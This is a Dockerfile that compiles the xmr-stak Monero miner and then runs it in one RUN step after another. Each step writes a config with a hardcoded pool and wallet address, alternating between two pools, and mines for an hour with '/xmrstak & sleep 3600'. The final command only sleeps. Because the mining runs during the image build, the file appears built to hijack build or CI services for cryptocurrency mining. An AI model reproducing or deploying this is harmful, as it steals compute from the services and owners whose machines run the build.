#FROM eliteminer/xmrig_zero_docker
FROM ubuntu:latest

#RUN cp /usr/bin/xmrig /xmrig

RUN apt-get update && \
        apt-get install -y --no-install-recommends \
          build-essential \
          libssl-dev \
          libhwloc-dev \
          cmake \
          libmicrohttpd-dev \
          git \
          ca-certificates && \
#          python3 && \
        rm -rf /var/lib/apt/lists/* && \
        git clone https://github.com/fireice-uk/xmr-stak.git && \
        mkdir xmr-stak/build && \
        cd xmr-stak/build && \
        cmake -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .. && \
        make install && \
        apt-get -y purge \
          build-essential \
          cmake \
          git && \
        apt-get autoremove -y --purge && \
        apt-get clean -y && \
        cp /xmr-stak/build/bin/xmr-stak /xmrstak

#RUN python3 -m pip install psutil

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600



RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://pool.supportshg.com:3333\", \"wallet_address\" : \"SH4NynGyDPcEmvUZrPbwSoMk2RNo7cWrQKHnKuFeKaQvF4DbHKXo7KwSLtZp9b63MCU4k6CkDp5i6VE54bwx6R9E23c1jYgWT+gl_4\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600
RUN echo "\"pool_list\" :[	{\"pool_address\" : \"stratum+tcp://masari.superpools.net:3333\", \"wallet_address\" : \"5pqUTCEcg5tjfdpuE8ZQu2JEdFTdgN2fzcydv5e5ypkcHuLRdG5zXkGZoWMz2KhJpxKKf5oto4KTh53v7iBbjNHgPT9soLC.2000\", \"pool_password\" : \"x\", \"use_nicehash\" : false, \"use_tls\" : false, \"tls_fingerprint\" : \"\", \"pool_weight\" : 1 },],\"currency\" : \"monero\",\"call_timeout\" : 10,\"retry_time\" : 30,\"giveup_limit\" : 0,\"verbose_level\" : 4,\"print_motd\" : true,\"h_print_time\" : 60,\"aes_override\" : null,\"use_slow_memory\" : \"warn\",\"tls_secure_algo\" : true,\"daemon_mode\" : false,\"flush_stdout\" : true,\"output_file\" : \"\",\"httpd_port\" : 0,\"http_login\" : \"\",\"http_pass\" : \"\",\"prefer_ipv4\" : true," > /config.txt
RUN /xmrstak & sleep 3600

#COPY runner.py /runner.py
#RUN ls -l /
#RUN python3 /runner.py

CMD ["sleep", "3600000000"]
